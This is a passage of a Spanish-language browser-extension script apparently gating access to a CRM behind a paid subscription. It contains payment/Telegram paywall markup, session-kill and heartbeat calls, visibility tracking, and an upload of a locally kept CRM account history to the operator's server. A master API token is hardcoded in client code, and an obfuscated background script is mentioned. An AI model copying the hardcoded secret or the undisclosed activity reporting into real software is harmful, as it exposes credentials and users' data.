                        const accionZoom = "const o=document.createElement('div');o.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.95);z-index:2147483647;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-direction:column;gap:20px;';const i=document.createElement('img');i.src='https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=https://t.me/extensionesgral&margin=0';i.style.cssText='max-width:90%;max-height:80%;border:5px solid #38bdf8;border-radius:20px;box-shadow:0 0 50px rgba(56,189,248,0.5);';const t=document.createElement('p');t.innerText='Toca para cerrar';t.style.cssText='color:white;font-family:sans-serif;font-size:16px;margin:0;font-weight:bold;';o.appendChild(i);o.appendChild(t);o.onclick=()=>o.remove();document.body.appendChild(o);";
                        
                        const qrTelegramHtml = `
                            <div title="Clic para ampliar" onclick="${accionZoom}" style="background: white; border-radius: 8px; padding: 4px; display: flex; flex-direction: column; align-items: center; justify-content: center; box-shadow: 0 4px 10px rgba(0,0,0,0.5); border: 2px solid #38bdf8; width: 80px; height: 80px; flex-shrink: 0; margin-left: 10px; cursor: pointer; position: relative; transition: transform 0.2s;" onmouseover="this.style.transform='scale(1.05)'" onmouseout="this.style.transform='scale(1)'">
                                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://t.me/extensionesgral&margin=0" alt="QR Telegram" style="width: 100%; height: 100%; object-fit: contain;">
                                <div style="position: absolute; bottom: -8px; background: #38bdf8; color: #000; font-size: 9px; font-weight: bold; padding: 2px 6px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.5);">AMPLIAR 🔍</div>
                            </div>
                        `;

                        // Selección de Instrucciones (Con el pequeño QR y Botón incrustados a la izquierda)
                        let pasosInstrucciones = "";

                        if (esBolivia) {
                            pasosInstrucciones = `
                                <div style="display: flex; flex-direction: row; gap: 15px; align-items: center;">
                                    <div style="background: #a855f7; color: white; font-weight: bold; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; flex-shrink: 0;">1</div>
                                    <p style="margin: 0; font-size: 15px; color: #e2e8f0; line-height: 1.4;">Escanea el código QR de la derecha para pagar.</p>
                                </div>
                                <div style="display: flex; flex-direction: row; gap: 15px; align-items: flex-start;">
                                    <div style="background: #a855f7; color: white; font-weight: bold; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; flex-shrink: 0; margin-top: 5px;">2</div>
                                    <div style="display: flex; flex-direction: row; align-items: center; justify-content: space-between; width: 100%; background: rgba(56, 189, 248, 0.05); border: 1px dashed rgba(56, 189, 248, 0.3); padding: 10px 15px; border-radius: 10px;">
                                        <div style="display: flex; flex-direction: column; gap: 10px;">
                                            <p style="margin: 0; font-size: 14px; color: #e2e8f0; line-height: 1.4;">Comunícate y envía el comprobante a Telegram mediante el enlace o escaneando este QR:</p>
                                            ${linkTelegramHtml}
                                        </div>
                                        ${qrTelegramHtml}
                                    </div>
                                </div>
                            `;
                        } else if (esColombia) {
                            pasosInstrucciones = `
                                <div style="display: flex; flex-direction: row; gap: 15px; align-items: flex-start;">
                                    <div style="background: #a855f7; color: white; font-weight: bold; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; flex-shrink: 0; margin-top: 5px;">1</div>
                                    <div style="display: flex; flex-direction: column; gap: 10px; width: 100%;">
                                        <p style="margin: 0; font-size: 15px; color: #e2e8f0; line-height: 1.4;"><b>Opción A (USDT):</b> Escanea el QR de Binance Pay a la derecha.</p>
                                        <div style="display: flex; flex-direction: row; align-items: center; justify-content: space-between; width: 100%; background: rgba(56, 189, 248, 0.1); padding: 12px 15px; border: 1px solid rgba(56,189,248,0.3); border-radius: 10px;">
                                            <div style="display: flex; flex-direction: column; gap: 10px;">
                                                <p style="margin: 0; font-size: 14px; color: #e2e8f0; line-height: 1.4;"><b>Opción B (Pesos):</b> Pago local (Aprox. 16.000 COP) contactándonos a Telegram por el enlace o escaneando el QR:</p>
                                                ${linkTelegramHtml}
                                            </div>
                                            ${qrTelegramHtml}
                                        </div>
                                    </div>
                                </div>
                                <div style="display: flex; flex-direction: row; gap: 15px; align-items: center; margin-top: 5px;">
                                    <div style="background: #a855f7; color: white; font-weight: bold; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; flex-shrink: 0;">2</div>
                                    <p style="margin: 0; font-size: 15px; color: #e2e8f0; line-height: 1.4;">Envía tu comprobante de pago por Telegram.</p>
                                </div>
                            `;
                        } else {
                            pasosInstrucciones = `
                                <div style="display: flex; flex-direction: row; gap: 15px; align-items: center;">
                                    <div style="background: #a855f7; color: white; font-weight: bold; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; flex-shrink: 0;">1</div>
                                    <p style="margin: 0; font-size: 15px; color: #e2e8f0; line-height: 1.4;">Escanea el código QR de Binance Pay a la derecha para pagar.</p>
                                </div>
                                <div style="display: flex; flex-direction: row; gap: 15px; align-items: flex-start;">
                                    <div style="background: #a855f7; color: white; font-weight: bold; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; flex-shrink: 0; margin-top: 5px;">2</div>
                                    <div style="display: flex; flex-direction: row; align-items: center; justify-content: space-between; width: 100%; background: rgba(56, 189, 248, 0.05); border: 1px dashed rgba(56, 189, 248, 0.3); padding: 10px 15px; border-radius: 10px;">
                                        <div style="display: flex; flex-direction: column; gap: 10px;">
                                            <p style="margin: 0; font-size: 14px; color: #e2e8f0; line-height: 1.4;">Comunícate y envía el comprobante a Telegram mediante el enlace o escaneando este QR:</p>
                                            ${linkTelegramHtml}
                                        </div>
                                        ${qrTelegramHtml}
                                    </div>
                                </div>
                            `;
                        }

                        // Nuevo HTML: Diseño final dinámico (QR Pago gigante a la derecha)
                        msgBox.innerHTML = `
                            <div style="background: rgba(15, 23, 42, 0.98); border: 3px solid #a855f7; border-radius: 20px; padding: 40px; text-align: left; color: white; box-shadow: 0 0 50px rgba(168, 85, 247, 0.6); font-family: sans-serif; display: flex; flex-direction: row; gap: 40px; justify-content: space-between; align-items: stretch; border-color: transparent; border-image: linear-gradient(135deg, #a855f7, #6d28d9) 1; border-style: solid; border-width: 3px;">
                                
                                <div style="flex: 0 0 58%; display: flex; flex-direction: column; gap: 15px; justify-content: space-between;">
                                    
                                    <div style="display: flex; flex-direction: column; gap: 15px;">
                                        <h1 style="color: white; margin: 0; font-weight: 900; font-size: 30px; letter-spacing: 1px;">⚠️ SUSCRIPCIÓN VENCIDA ⚠️</h1>
                                        <p style="font-size: 16px; margin: 0; color: #cbd5e1; line-height: 1.5;">Tu acceso mensual requiere renovación.</p>
                                        
                                        <div style="background: rgba(239, 68, 68, 0.15); border: 2px solid #ef4444; border-radius: 10px; padding: 15px 20px; display: flex; flex-direction: row; align-items: center; gap: 10px; justify-content: flex-start; box-shadow: 0 4px 10px rgba(239, 68, 68, 0.2); width: fit-content; margin: 5px 0;">
                                            <p style="margin: 0; font-size: 18px; font-weight: bold; color: #fca5a5;">Monto a pagar:</p>
                                            <p style="margin: 0; font-size: 28px; font-weight: 900; color: #fff; background: rgba(0,0,0,0.4); padding: 5px 12px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.2);">${monedaPrincipal} ${montoPagar}</p>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; flex-direction: column; gap: 18px; margin: 10px 0;">
                                        ${pasosInstrucciones}
                                        
                                        <div style="display: flex; flex-direction: row; gap: 15px; align-items: center; margin-top: 5px;">
                                            <div style="background: #a855f7; color: white; font-weight: bold; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; flex-shrink: 0;">3</div>
                                            <div style="display: flex; align-items: center; gap: 8px;">
                                                <p style="margin: 0; font-size: 15px; color: #e2e8f0;">No olvides incluir tu</p>
                                                <div style="background: rgba(0,0,0,0.5); border: 2px solid #a855f7; border-radius: 8px; padding: 6px 12px;">
                                                    <b style="color: white; font-size: 18px; font-weight: 900; letter-spacing: 1px;">ID: ${u.toUpperCase()}</b>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <button onclick="window.location.reload()" style="background: linear-gradient(135deg, #a855f7, #6d28d9); border: none; padding: 18px 20px; color: white; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 17px; width: 100%; box-shadow: 0 5px 15px rgba(109, 40, 217, 0.4); transition: transform 0.2s, box-shadow 0.2s, background 0.2s; margin-top: auto;" onmouseover="this.style.transform='scale(1.02)'; this.style.boxShadow='0 8px 20px rgba(109, 40, 217, 0.5)'; this.style.background='linear-gradient(135deg, #9333ea, #7e22ce)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 5px 15px rgba(109, 40, 217, 0.4)'; this.style.background='linear-gradient(135deg, #a855f7, #6d28d9)';">
                                        Ya envié el comprobante (Recargar página)
                                    </button>
                                </div>

                                <div style="flex: 0 0 36%; background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(255,255,255,0.1); border-radius: 15px; padding: 25px; display: flex; flex-direction: column; align-items: center; justify-content: center; box-shadow: inset 0 0 15px rgba(0,0,0,0.5); gap: 15px;">
                                    <p style="margin: 0; color: #fcd34d; font-weight: bold; letter-spacing: 2px; font-size: 18px; text-shadow: 0 2px 4px rgba(0,0,0,0.8); text-align: center;">${tituloQR}</p>
                                    <div style="background: white; border-radius: 15px; padding: 15px; display: flex; align-items: center; justify-content: center; box-shadow: 0 8px 20px rgba(0,0,0,0.6); border: 4px solid white; aspect-ratio: 1 / 1; width: 100%;">
                                        <img src="${imgQR}" alt="Código QR de Pago Principal" style="width: 100%; height: 100%; object-fit: contain;">
                                    </div>
                                </div>

                            </div>
                        `;
                    } else {
                        // Comportamiento normal de error
                        msgBox.innerText = '❌ ' + res.message; msgBox.style.color = '#ff6b6b';

                        if (res.message.toLowerCase().includes('límite') || res.message.toLowerCase().includes('limite')) {
                            if (!document.getElementById('btn-kill-limit')) {const btnKill = document.createElement('button');
                                btnKill.id = 'btn-kill-limit';
                                btnKill.innerHTML = '🗑️ BORRAR SESIONES ACTIVAS';
                                Object.assign(btnKill.style, {
                                    marginTop: '15px', width: '100%', padding: '10px',
                                    backgroundColor: 'rgba(220, 38, 38, 0.15)', border: '1px solid #ef4444',
                                    color: '#fca5a5', borderRadius: '50px', fontSize: '13px', fontWeight: 'bold',
                                    cursor: 'pointer', transition: 'all 0.3s', letterSpacing: '0.5px'
                                });
                                btnKill.onmouseenter = () => { btnKill.style.backgroundColor = '#ef4444'; btnKill.style.color = 'white'; };
                                btnKill.onmouseleave = () => { btnKill.style.backgroundColor = 'rgba(220, 38, 38, 0.15)'; btnKill.style.color = '#fca5a5'; };
                                
                                // 🔥 AQUÍ EMPIEZA LA LÓGICA CORREGIDA (CON TOKEN)
                                btnKill.onclick = async () => {
                                    const kUser = userInput.inp.value.trim();
                                    const kPass = passInput.inp.value.trim();
                                    if (!kUser || !kPass) { msgBox.innerText = '⚠️ Se requiere Usuario y Contraseña'; return; }

                                    btnKill.disabled = true; btnKill.innerText = '⏳ Verificando...';

                                    try {
                                        // 1. VERIFICAR CREDENCIALES
                                        const urlCheck = new URL(API_URL);
                                        urlCheck.searchParams.append('token', MASTER_TOKEN); // 🔥 AGREGADO
                                        urlCheck.searchParams.append('action', 'login');
                                        urlCheck.searchParams.append('usuario', kUser);
                                        urlCheck.searchParams.append('contrasena', kPass);
                                        urlCheck.searchParams.append('sessionId', 'check_kill_' + Date.now());

                                        const checkRes = await new Promise(resolve => {
                                            safeSendMessage({ action: 'proxy_fetch', url: urlCheck.toString(), options: { method: 'GET' } }, resolve);
                                        });

                                        if (!checkRes || !checkRes.success || !checkRes.data) throw new Error('Error de conexión');
                                        if (checkRes.data.success === false && checkRes.data.message.includes('Credenciales')) throw new Error('Contraseña Mal');

                                        // 2. EJECUTAR EL BORRADO REAL
                                        btnKill.innerText = '🔥 Borrando...';
                                        const urlKK = new URL(API_URL);
                                        urlKK.searchParams.append('token', MASTER_TOKEN); // 🔥 AGREGADO
                                        urlKK.searchParams.append('action','kill_all');
                                        urlKK.searchParams.append('usuario', kUser);
                                        
                                        await new Promise(r => safeSendMessage({ action: 'proxy_fetch', url: urlKK.toString(), options: { method: 'GET' } }, r));
                                        
                                        msgBox.innerText = '✅ Sesiones borradas. Intenta ingresar.'; 
                                        msgBox.style.color = '#34d399'; 
                                        btnKill.remove();
                                        
                                    } catch (e) {
                                        btnKill.innerText = '❌ Error'; 
                                        msgBox.innerText = '⛔ ' + e.message; 
                                        setTimeout(() => { btnKill.disabled=false; btnKill.innerText='🗑️ BORRAR SESIONES ACTIVAS'; }, 3000);
                                    }
                                };
                                msgBox.parentNode.insertBefore(btnKill, msgBox.nextSibling);
                            }
                        }
                    }
                }
            });
        };
        btnLogin.onclick = handleLogin;
        passInput.inp.onkeydown = (e) => { if (e.key === 'Enter') handleLogin(); };

        // Le damos un ID al msgBox para poder interactuar con él desde el onchange del selector
        msgBox.id = 'temp-msg-box';

        // 🔥 Inyectamos inputs en el nuevo orden (Usuario -> Pass -> Server) para evitar guardado erróneo en el navegador 🔥
        formContainer.append(title, userInput.wrap, passInput.wrap, serverInput.wrap, btnLogin, extraLinksDiv, btnRepair, msgBox);
        overlay.appendChild(formContainer); document.body.appendChild(overlay);
    }

    // ============================================================
    // ⏱️ WIDGET RELOJ
    // ============================================================
    function checkTimerWidget() {
        const currentUrl = window.location.href;
        const isTargetUrl = TARGET_URLS.some(url => currentUrl.startsWith(url));
        const loggedUser = localStorage.getItem('usuarioLogueado');
        const existingTimer = document.getElementById('addon-session-timer');

        if (!isTargetUrl || !loggedUser) { if (existingTimer) existingTimer.remove(); return; }
        if (existingTimer) { updateTimerText(existingTimer); return; }

        const timer = document.createElement('div');
        timer.id = 'addon-session-timer';
        Object.assign(timer.style, {
            position: 'fixed', bottom: '0', left: '50%', transform: 'translateX(-50%)', zIndex: '2147483647',
            backgroundColor: 'rgba(15, 23, 42, 0.85)', backdropFilter: 'blur(4px)', color: '#94a3b8', 
            fontFamily: 'monospace', fontSize: '11px', fontWeight: 'bold', letterSpacing: '1px',
            padding: '2px 15px', borderTopLeftRadius: '10px', borderTopRightRadius: '10px',
            borderTop: '1px solid rgba(255,255,255,0.1)', pointerEvents: 'none', userSelect: 'none'
        });

        document.body.appendChild(timer);
        updateTimerText(timer);
    }

    function updateTimerText(element) {
        const loginTime = parseInt(localStorage.getItem('loginTimestamp') || '0');
        let limit = parseInt(localStorage.getItem('sessionLimit'));
        if (isNaN(limit)) { element.innerText = '--:--:--'; return; }
        if (limit === -1) { element.innerText = '∞:∞:∞'; element.style.color = '#34d399'; return; }

        const remaining = (loginTime + limit) - Date.now();
        if (remaining <= 0) { 
            element.innerText = '00:00:00'; element.style.color = '#ef4444'; 
            // 🔥 SI EL TIEMPO LLEGA A CERO, CIERRA SESIÓN AUTOMÁTICAMENTE
            if (localStorage.getItem('usuarioLogueado')) logoutAndClean();
            return; 
        }

        const h = Math.floor((remaining / (1000 * 60 * 60)));
        const m = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
        const s = Math.floor((remaining % (1000 * 60)) / 1000);
        element.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
        element.style.color = (remaining < 300000) ? '#fbbf24' : '#94a3b8';
    }

    // ==========================================
    // 🎵 FUNCIONES DE AUDIO
    // ==========================================
    const SOUND_URL = 'https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3';
    
    async function initAudioSystem() {
        const cachedSound = localStorage.getItem('SYSTEM_NOTIF_SOUND');
        if (!cachedSound) {
            try {
                const response = await fetch(SOUND_URL);
                const blob = await response.blob();
                const reader = new FileReader();
                reader.onloadend = function() { localStorage.setItem('SYSTEM_NOTIF_SOUND', reader.result); };
                reader.readAsDataURL(blob);
            } catch (e) { console.error('Error cacheando audio:', e); }
        }
    }

    function unlockAudio() {
        if (audioContextUnlocked) return;
        const sound = localStorage.getItem('SYSTEM_NOTIF_SOUND');
        if (sound) {
            const a = new Audio(sound); a.volume = 0;
            a.play().then(() => { audioContextUnlocked = true; document.removeEventListener('click', unlockAudio); }).catch(e => {});
        }
    }
    document.addEventListener('click', unlockAudio);
    initAudioSystem();

    function playAlertSound(times = 1) {
    const soundData = localStorage.getItem('SYSTEM_NOTIF_SOUND');
    if (!soundData) return; 

    // Bloqueo Anti-Eco entre pestañas
    const lastSound = parseInt(localStorage.getItem('LAST_SOUND_PLAY_TS') || '0');
    if (Date.now() - lastSound < 2000) return; 
    localStorage.setItem('LAST_SOUND_PLAY_TS', Date.now());

    // 🔥 ENVIAR SONIDO AL BACKGROUND (Sin bucle)
    safeSendMessage({ action: 'play_audio_maestro', soundUrl: soundData, loop: false });
}
    // =========================================================
    // 🔥 ESCUCHA EN TIEMPO REAL (FIREBASE) + MOTOR HÍBRIDO
    // =========================================================
    window.BG_MODE_DYNAMIC = false; // Por defecto asumimos el estático/ofuscado

    // 🛠️ HERRAMIENTA HÍBRIDA: Constructor inteligente de URLs
    function getHybridUrl(msgId, user, status, timestamp) {
        const subActivo = localStorage.getItem('serverSubdomain');
        let urlDestino = CEREBRO_URL;
        let tokenUsado = "SST_V12_CORP_SECURE_2026_X9"; // Fallback seguro
        
        try { if (typeof MASTER_TOKEN !== 'undefined') tokenUsado = MASTER_TOKEN; } catch(e){}

        if (window.BG_MODE_DYNAMIC) {
            // Background Avanzado (Source 4): Enrutamiento Dinámico
            urlDestino = (subActivo && SERVERS_DB[subActivo]) ? SERVERS_DB[subActivo].script : CEREBRO_URL;
        } else {
            // Background Ofuscado (Source 3): Enrutamiento Estático y Token Hardcodeado
            urlDestino = CEREBRO_URL;
            tokenUsado = "SST_V12_CORP_SECURE_2026_X9";
        }
        return `${urlDestino}?token=${tokenUsado}&action=ack_aviso&msgId=${msgId}&usuario=${encodeURIComponent(user)}&ts=${timestamp}&status=${status}`;
    }

    function iniciarEscuchaFirebase() {
        const miUsuario = localStorage.getItem('usuarioLogueado');
        const miRol = localStorage.getItem('userRole') || 'AGENTE';
        if (!miUsuario) return;

        // 🕵️ DETECCIÓN DE BACKGROUND (Ping al worker)
        safeSendMessage({ action: "ping_keep_alive" }, (res) => {
            if (res && res.status === "alive") {
                window.BG_MODE_DYNAMIC = true;
                console.log("🟢 SST HÍBRIDO: Background avanzado detectado (Dinámico)");
            }
        });

        // Le pasa la responsabilidad de conectarse a Firebase al Background
        safeSendMessage({
            action: 'iniciar_escucha_maestra',
            firebaseUrl: FIREBASE_URL,
            usuario: miUsuario,
            rol: miRol
        });
    }

    // 🔥 NUEVO: Escuchador para pintar la alerta enviada desde el Background
    chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
        if (request.action === "renderizar_alerta") {
            const aviso = request.aviso;
            const miUsuario = localStorage.getItem('usuarioLogueado');

            const isAlertAck = localStorage.getItem('ALERT_ACK_' + aviso.id);
            const isNotifShown = localStorage.getItem('NOTIF_SHOWN_' + aviso.id);
            const isDelivered = localStorage.getItem('DELIVERED_' + aviso.id);

            // 🛡️ AQUÍ ESTÁ TU LÓGICA ORIGINAL RESTAURADA: Reportar ENTREGADO con Anti-Colapso
            if (!isDelivered) {
                localStorage.setItem('DELIVERED_' + aviso.id, 'true');
                const tiempoCapturado = Date.now(); 
                const randomDelay = Math.floor(Math.random() * 11000) + 1000; 

                setTimeout(() => {
                    // 🔥 MOTOR HÍBRIDO: Resolución Inteligente
                    const urlEntrega = getHybridUrl(aviso.id, miUsuario, 'ENTREGADO', tiempoCapturado);
                    
                    const enviarConInsistencia = (intentosRestantes) => {
                        try {
                            safeSendMessage({ action: 'proxy_fetch', url: urlEntrega, options: { method: 'GET' } }, (response) => {
                                if (!response || !response.success || (response.data && response.data.error)) {
                                    if (intentosRestantes > 0) {
                                        setTimeout(() => enviarConInsistencia(intentosRestantes - 1), 2000 + Math.random() * 3000);
                                    }
                                }
                            });
                        } catch(e) {}
                    };
                    enviarConInsistencia(6);
                }, randomDelay);
            }

            // Pintar y Reproducir Audio
            if (aviso.type === 'ALERT' && !isAlertAck) {
                localStorage.setItem('SHARED_MSG_DATA', JSON.stringify({id: aviso.id, msg: aviso.msg, timestamp: Date.now(), type: 'ALERT'}));
                safeSendMessage({ action: "unmute_tab" });
                showPersistentAlert(aviso.msg, aviso.id);
            } else if (aviso.type === 'NORMAL' && !isNotifShown) {
                localStorage.setItem('NOTIF_SHOWN_' + aviso.id, 'true');
                localStorage.setItem('SHARED_MSG_DATA', JSON.stringify({id: aviso.id, msg: aviso.msg, timestamp: Date.now(), type: 'NORMAL'}));
                safeSendMessage({ action: "unmute_tab" });
                playAlertSound(1);
                showNotification('📢 ' + aviso.msg, aviso.id, 'info');
                trySystemNotification(aviso.msg, aviso.id, '📢 NUEVO AVISO CRM');
            }
        }
    });
    // ==========================================
    // ❤️ HEARTBEAT (CRONÓMETRO + AVISOS)
    // ==========================================
    function heartbeat(fromVisibility = false) {
        if (!isExtensionAlive) return;

        lastHeartbeatTime = Date.now();

        const user = localStorage.getItem('usuarioLogueado');
        const sessId = localStorage.getItem('sessionId'); 
        const devId = localStorage.getItem('deviceUniqueId'); 

        if (!user || !sessId) return;

        // ⏱️ 1. ACUMULADOR EXACTO DE TIEMPO (Funciona SIEMPRE sin importar el escudo)
        const lastVisTs = parseInt(localStorage.getItem('CRM_TAB_VISIBLE_TS') || '0');
        const isGloballyVisible = (Date.now() - lastVisTs) < 5000; 
        
        let accumulatedMs = parseInt(localStorage.getItem('CRM_ACCUMULATED_MS') || '0');
        let lastEval = parseInt(localStorage.getItem('LAST_EVAL_TS') || Date.now().toString());
        let elapsed = Date.now() - lastEval;
        
        localStorage.setItem('LAST_EVAL_TS', Date.now().toString());
        
        // Recorte seguro: Evalúa el tiempo real entre ticks de pestañas sin perder segundos
        if (elapsed > 25000) elapsed = 20000; 
        if (elapsed < 0) elapsed = 0;

        let shouldUpdateExcel = false;
        
        let forceFetchTarget = parseInt(localStorage.getItem('CRM_FORCE_FETCH_TS') || '0');

        if (forceFetchTarget > 0) {
            // FASE 2: Ya miró 3 min. Ahora el reloj espera 7 minutos en segundo plano (mirando o no).
            if (Date.now() >= forceFetchTarget) {
                shouldUpdateExcel = true;
            }
        } else {
            // FASE 1: Sumando los 3 minutos obligatorios de mirar activamente la pantalla.
            if (isGloballyVisible) {
                accumulatedMs += elapsed; 
                localStorage.setItem('CRM_ACCUMULATED_MS', accumulatedMs.toString());
            }

            // Al llegar a 3 minutos activos, disparamos el reloj de 7 minutos pasivos.
            if (accumulatedMs >= (3 * 60 * 1000)) { 
                localStorage.setItem('CRM_FORCE_FETCH_TS', (Date.now() + (7 * 60 * 1000)).toString());
                localStorage.setItem('CRM_ACCUMULATED_MS', '0'); // Vaciamos la alcancía activa
            }
        }

        // 🛡️ 2. ESCUDO ANTI-COLAPSO DE GOOGLE MULTI-PESTAÑA (110 segundos)
        const lastGlobalHb = parseInt(localStorage.getItem('LAST_GLOBAL_HB_TS') || '0');
        const umbral = fromVisibility ? 30000 : 110000; 
        
        // REGLA DE ORO: Bloqueamos el fetch SOLO si el escudo está activo Y NO hay que actualizar el Excel
        if (!shouldUpdateExcel && (Date.now() - lastGlobalHb < umbral)) {
            return; 
        }

        // Si la petición va a salir, sellamos el escudo para que otras pestañas no molesten a Google
        localStorage.setItem('LAST_GLOBAL_HB_TS', Date.now().toString());

        // Si la petición lleva la orden de actualizar Excel, reseteamos el contador pasivo a cero AHORA.
        if (shouldUpdateExcel) {
            localStorage.setItem('CRM_FORCE_FETCH_TS', '0');
        }

        // 🌐 3. RESOLUCIÓN DINÁMICA DE SERVIDOR (Ruteo Inteligente)
        const subActivo = localStorage.getItem('serverSubdomain');
        const apiDinamica = (subActivo && SERVERS_DB[subActivo]) ? SERVERS_DB[subActivo].script : API_URL;
        
        const url = new URL(apiDinamica);

        // 🔥 NUEVO: SINCRONIZADOR DEL HISTORIAL DE CUENTAS CRM 🔥
        if (localStorage.getItem('SST_NEEDS_SYNC') === 'true') {
            const historialPendiente = localStorage.getItem('SST_CRM_HISTORY');
            if (historialPendiente && historialPendiente !== '[]') {
                const payloadSync = {
                    token: MASTER_TOKEN,
                    action: 'sync_historial_cuentas',
                    usuarioExt: user,
                    logs: JSON.parse(historialPendiente)
                };
                
                safeSendMessage({ 
                    action: 'proxy_fetch', 
                    url: API_URL, 
                    options: { 
                        method: 'POST', 
                        body: JSON.stringify(payloadSync),
                        headers: { 'Content-Type': 'application/json' }
                    } 
                }, (res) => {
                    if (res && res.success) {
                        // Limpiamos los que ya se enviaron exitosamente
                        localStorage.removeItem('SST_NEEDS_SYNC');
                        let currentLogs = JSON.parse(localStorage.getItem('SST_CRM_HISTORY') || '[]');
                        // Filtramos para dejar solo los nuevos que pudieron generarse mientras se enviaba
                        currentLogs = currentLogs.filter(c => !payloadSync.logs.some(l => l.ts === c.ts));
                        localStorage.setItem('SST_CRM_HISTORY', JSON.stringify(currentLogs));
                    }
                });
            } else {
                localStorage.removeItem('SST_NEEDS_SYNC');
            }
        }
        // 🔥 FIN SINCRONIZADOR 🔥
        url.searchParams.append('token', MASTER_TOKEN);
        url.searchParams.append('action', 'heartbeat');
        url.searchParams.append('usuario', user);
        url.searchParams.append('sessionId', sessId); 
        if (devId) url.searchParams.append('deviceId', devId);
        url.searchParams.append('cb', Date.now()); 
        url.searchParams.append('updateExcel', shouldUpdateExcel ? 'true' : 'false');
        url.searchParams.append('ts', Date.now()); 
        
        safeSendMessage({ action: 'proxy_fetch', url: url.toString(), options: { method: 'GET' } }, response => {
            const res = (response && response.success) ? response.data : null;
            if (res && res.success === false) { logoutAndClean(); return; }

            if (res && res.success === true && res.aviso) {
                const msgId = res.aviso.id;
                
                // 🔥 REGLA 1 HORA EN HEARTBEAT
                if (Date.now() - msgId > 3600000) return;

                const isAlertAck = localStorage.getItem('ALERT_ACK_' + msgId);
                const isNotifAck = localStorage.getItem('NOTIF_ACK_' + msgId);
                const isNotifShown = localStorage.getItem('NOTIF_SHOWN_' + msgId);
                const isDelivered = localStorage.getItem('DELIVERED_' + msgId);

                // Evitar repeticiones zombie
                if (isAlertAck || isNotifAck || (res.aviso.type === 'NORMAL' && isNotifShown)) return; 

                // Reportar entregado si Firebase falló
                if (!isDelivered) {
                    localStorage.setItem('DELIVERED_' + msgId, 'true');
                    
                    // 🔥 MOTOR HÍBRIDO: Resolución Inteligente
                    const urlEntregaHB = getHybridUrl(msgId, user, 'ENTREGADO', Date.now());
                    try { safeSendMessage({ action: 'proxy_fetch', url: urlEntregaHB, options: { method: 'GET' } }); } catch(e){}
                }

                localStorage.setItem('SHARED_MSG_DATA', JSON.stringify({id: msgId, msg: res.aviso.msg, timestamp: Date.now(), type: res.aviso.type}));
                safeSendMessage({ action: "unmute_tab" });

                if (res.aviso.type === 'ALERT') {
                    showPersistentAlert(res.aviso.msg, msgId);
                    // 🚫 NO HAY ALERTA DE WINDOWS PARA LA ROJA
                } else {
                    localStorage.setItem('NOTIF_SHOWN_' + msgId, 'true');
                    playAlertSound(1);
                    showNotification('📢 ' + res.aviso.msg, msgId, 'info'); 
                    trySystemNotification(res.aviso.msg, msgId, '📢 NUEVO AVISO CRM'); // ✅ Windows solo en Normal
                }
            }
        });
    }

    // ==========================================
    // 🧠 CEREBRO DE SINCRONIZACIÓN (PESTAÑA A PESTAÑA)
    // ==========================================
    window.addEventListener('storage', (e) => {
        // 🔴 1. SINCRONIZACIÓN DE LOGOUT
        if (e.key === 'usuarioLogueado' && !e.newValue) {
            logoutAndClean();
        }

        // 🟢 2. SINCRONIZACIÓN DE LOGIN
        if (e.key === 'usuarioLogueado' && e.newValue) {
            document.getElementById('addon-login-overlay')?.remove();
            checkLogoutButton();
            checkTimerWidget();
            initAudioSystem();
            heartbeat();
        }
        
        // 📢 3. SINCRONIZACIÓN DE MENSAJES (Alertas compartidas)
        if (e.key === 'SHARED_MSG_DATA' && e.newValue) {
            const data = JSON.parse(e.newValue);
            if (Date.now() - data.timestamp < 10000) { 
                
                safeSendMessage({ action: "unmute_tab" });

                if (data.type === 'ALERT') {
                    showPersistentAlert(data.msg, data.id);
                    // 🚫 Sin Windows para la roja
                } else {
                    playAlertSound(1);
                    showNotification('📢 ' + data.msg, data.id, 'info');
                    trySystemNotification(data.msg, data.id, '📢 NUEVO AVISO CRM');
                }
            }
        }

        // 👁️ 4. SINCRONIZACIÓN DE "LEÍDO" (Cierra Alerta Roja en todas)
        if (e.key.startsWith('ALERT_ACK_')) {
            document.getElementById('addon-alert-overlay')?.remove();
            stopAlertSound();
        }

        // ✔️ 5. SINCRONIZACIÓN DE "ACEPTAR" (Cierra Notificación Negra en todas)
        if (e.key.startsWith('NOTIF_ACK_')) {
            const id = e.key.replace('NOTIF_ACK_', '');
            const toast = document.getElementById('notif-' + id);
            if (toast) closeThisToast(toast);
        }

        // 🚪 6. SINCRONIZACIÓN MAESTRA DE LOGOUT (Muestra modal o lo cancela en vivo)
        if (e.key === 'SST_SYNC_SHOW_LOGOUT' && e.newValue) {
            window.dispatchEvent(new CustomEvent('SST_SHOW_LOGOUT_PROMPT'));
        }
        if (e.key === 'SST_SYNC_CANCEL_LOGOUT' && e.newValue) {
            document.getElementById('sst-logout-modal-sync')?.remove();
        }

        // 🧹 6. AVISO VISUAL DE CACHÉ BORRADO DESDE OTRA PESTAÑA
        if (e.key === 'SST_CACHE_CLEARED' && e.newValue) {
            const aviso = document.createElement('div');
            aviso.innerText = '🧹 Sistema optimizado en otra pestaña';
            Object.assign(aviso.style, {
                position: 'fixed', bottom: '20px', left: '20px', background: 'rgba(34, 211, 238, 0.95)', 
